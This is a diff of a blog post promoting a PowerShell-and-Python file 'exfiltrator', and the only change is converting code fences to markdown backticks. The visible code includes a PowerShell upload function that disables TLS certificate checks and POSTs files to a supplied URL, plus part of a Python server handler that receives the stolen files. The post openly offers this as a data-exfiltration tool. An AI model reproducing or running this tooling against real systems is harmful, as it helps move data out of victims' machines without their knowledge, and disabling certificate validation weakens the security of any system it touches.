@@ -28,7 +28,8 @@ See the current version on GitHub: Jeamajoal's Lazy PwshPy Exfiltrator. The Powe
 
 <b>Powershell snippet for uploading files:</b>
 
-'''powershell
+```powershell
+
 function UploadToWebServer($filepath, $url) {
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;
         $filename = Split-Path $FilePath -Leaf
@@ -56,11 +57,12 @@ function UploadToWebServer($filepath, $url) {
 
         Invoke-RestMethod $url -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
     }
-'''
+    
+```
 
 <b>Python server side for handling the data:</b>
 
-'''python
+```python
 def deal_post_data(self):
         global serverpath 
         line = b'' #Initialize line data as byte
@@ -164,7 +166,7 @@ def deal_post_data(self):
             return ('succeeded',self.client_address,fn )
         except:
             return ('Failed',self.client_address,fn )
-'''
+```
 
 Check out the github repo where i will add some use caes and screenshots so you can feel like you were there.
 
